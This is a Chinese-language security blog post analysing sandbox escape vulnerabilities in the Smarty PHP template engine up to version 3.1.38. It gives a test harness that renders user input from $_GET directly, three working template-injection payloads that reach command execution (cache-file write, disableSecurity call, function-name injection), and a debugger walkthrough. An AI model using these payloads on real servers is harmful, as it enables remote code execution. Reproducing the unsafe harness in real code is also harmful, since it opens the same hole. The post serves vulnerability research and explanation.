> 原文链接: https://www.anquanke.com//post/id/235505 


# SmartyPHP沙箱逃逸分析


                                阅读量   
                                **171508**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01e795371960f03978.jpg)](https://p2.ssl.qhimg.com/t01e795371960f03978.jpg)



## 介绍

Smarty是一个使用PHP写出来的模板引擎，是目前业界最著名的PHP模板引擎之一。它分离了逻辑代码和外在的内容，提供了一种易于管理和使用的方法，用来将原本与HTML代码混杂在一起PHP代码逻辑分离。简单的讲，目的就是要使PHP程序员同前端人员分离，使程序员改变程序的逻辑内容不会影响到前端人员的页面设计，前端人员重新修改页面不会影响到程序的程序逻辑，这在多人合作的项目中显的尤为重要。



## 沙箱

沙盒是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。<br>
沙盒通常严格控制其中的程序所能访问的资源，比如，沙盒可以提供用后即回收的磁盘及内存空间。在沙盒中，网络访问、对真实系统的访问、对输入设备的读取通常被禁止或是严格限制。从这个角度来说，沙盒属于虚拟化的一种。<br>
沙盒中的所有改动对操作系统不会造成任何损失。通常，这种技术被计算机技术人员广泛用于测试可能带毒的程序或是其他的恶意代码

在smarty php中<br>
sandbox默认为

```
&lt;?php
include_once('../libs/Smarty.class.php');
$smarty = new Smarty();
$smarty-&gt;enableSecurity();
$smarty-&gt;display($_GET['poc']);
```

更严格的沙箱机制为

```
&lt;?php
include_once('../libs/Smarty.class.php');
$smarty = new Smarty();
$my_security_policy = new Smarty_Security($smarty);
$my_security_policy-&gt;php_functions = null;
$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;
$my_security_policy-&gt;php_modifiers = null;
$my_security_policy-&gt;static_classes = null;
$my_security_policy-&gt;allow_super_globals = false;
$my_security_policy-&gt;allow_constants = false;
$my_security_policy-&gt;allow_php_tag = false;
$my_security_policy-&gt;streams = null;
$my_security_policy-&gt;php_modifiers = null;
$smarty-&gt;enableSecurity($my_security_policy);
$smarty-&gt;display($_GET['poc']);
```



## payload

版本: Smarty Template Engine &lt;= 3.1.38

```
?poc=string:`{`$s=$smarty.template_object-&gt;smarty`}``{`$fp=$smarty.template_object-&gt;compiled-&gt;filepath`}``{`Smarty_Internal_Runtime_WriteFile::writeFile($fp,"&lt;?php+phpinfo();",$s)`}`
```

```
?poc=string:`{`$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display('string:`{`system(\'id\')`}`')`}`
```

```
?poc=string:`{`function+name='rce()`{``}`;system("id");function+'`}``{`/function`}`

```



## 漏洞分析

### <a class="reference-link" name="%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"></a>静态分析

在process函数中我们可以发现首先判断了<br>
是否存在缓存文件<br>
如果不存在缓存文件就新建一个文件，如果存在缓存文件就include它<br>
所以payload执行两次就可以进行命令执行<br>
在此我们就在此进行了代码的插入

[![](https://p0.ssl.qhimg.com/t01ee739441bb207e6d.png)](https://p0.ssl.qhimg.com/t01ee739441bb207e6d.png)

我们看一下

[![](https://p1.ssl.qhimg.com/t01fa62fa6ceb121baf.png)](https://p1.ssl.qhimg.com/t01fa62fa6ceb121baf.png)

就可以将我们的payload写入缓存文件当中<br>
payload1 进行的就是再将缓存文件写入自己插入的代码<br>
payload2 进行的是先将smarty的enableSecurity()再指向了disableSecurity（）再进行命令执行<br>
payload3 进行的是Smarty_Internal_Runtime_TplFunction在tplFunctions的定义时没有正确的过滤所以导致的命令执行

payload 2、3可以绕过更严格的沙箱机制进行沙箱逃逸

### <a class="reference-link" name="%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"></a>动态调试

首先我们在display处下断点<br>
可以发现它进入了Smarty_Internal_TemplateBase的_execute

[![](https://p0.ssl.qhimg.com/t0139677508b6318f3b.png)](https://p0.ssl.qhimg.com/t0139677508b6318f3b.png)

我们可以看到<br>
首先执行_getSmartyObj();<br>
也就是新建了一个Smarty的对象<br>
之后进入if判断跳转到了这里

[![](https://p0.ssl.qhimg.com/t0126cd05581baccd56.png)](https://p0.ssl.qhimg.com/t0126cd05581baccd56.png)

我们可以看见是要新建一个template的对象<br>
执行之后可以发现已经将我们的payload储存到了template_resource当中

[![](https://p5.ssl.qhimg.com/t01b38c41edc86ff3a2.png)](https://p5.ssl.qhimg.com/t01b38c41edc86ff3a2.png)

再下面就是操作数据、合并数据等操作了<br>
我们直接进入render函数当中

[![](https://p4.ssl.qhimg.com/t018857c7fd007f2f3f.png)](https://p4.ssl.qhimg.com/t018857c7fd007f2f3f.png)

在这里我们可以发现由于缓存文件不存在因此我们要新建一个缓存文件

[![](https://p1.ssl.qhimg.com/t015c09adc5794a37e4.png)](https://p1.ssl.qhimg.com/t015c09adc5794a37e4.png)

这就是我们新建的cache的初始状态<br>
我们可以发现，我们就调用了writeFile将&lt;?php phpinfo;写入

[![](https://p4.ssl.qhimg.com/t01cecc0c4071cff4f5.png)](https://p4.ssl.qhimg.com/t01cecc0c4071cff4f5.png)

执行后我们就能发现缓存文件变为了我们插入的代码<br>
再次运行一次<br>
由于我们已经有了这个缓存文件<br>
所以就直接include这个文件了

[![](https://p0.ssl.qhimg.com/t017debf6f04d75359e.png)](https://p0.ssl.qhimg.com/t017debf6f04d75359e.png)

同理

执行命令执行时<br>
缓存文件变成了

[![](https://p4.ssl.qhimg.com/t01b36bcb5b2261f7e0.png)](https://p4.ssl.qhimg.com/t01b36bcb5b2261f7e0.png)

[![](https://md.byr.moe/uploads/upload_9387b2ba386c7a0da6ec424147b39fb3.png)](https://md.byr.moe/uploads/upload_9387b2ba386c7a0da6ec424147b39fb3.png)[![](https://p5.ssl.qhimg.com/t0106790c62171ecf4a.png)](https://p5.ssl.qhimg.com/t0106790c62171ecf4a.png)

[![](https://p2.ssl.qhimg.com/t01d8ff57f47d68465f.png)](https://p2.ssl.qhimg.com/t01d8ff57f47d68465f.png)

都可以执行命令执行之后include后获得回显



## 参考文章

[https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html](https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html)
